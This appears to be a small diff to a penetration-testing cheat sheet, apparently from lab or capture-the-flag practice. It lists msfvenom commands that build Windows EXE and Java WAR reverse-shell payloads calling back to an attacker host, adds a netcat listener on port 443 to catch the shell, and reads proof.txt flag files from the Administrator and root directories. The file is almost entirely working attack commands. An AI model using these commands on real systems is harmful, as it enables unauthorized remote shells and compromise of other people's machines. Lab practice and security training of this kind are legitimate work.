@@ -1,4 +1,5 @@
 msfvenom -p windows/shell_reverse_tcp LHOST=自己 LPORT=443 -f exe > evil.exe
 msfvenom -p java/shell_reverse_tcp LHOST=10.11.0.84 LPORT=443 -f war > /root/Desktop/tomcat.war
+nc -lvp 443
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
 cat /root/proof.txt
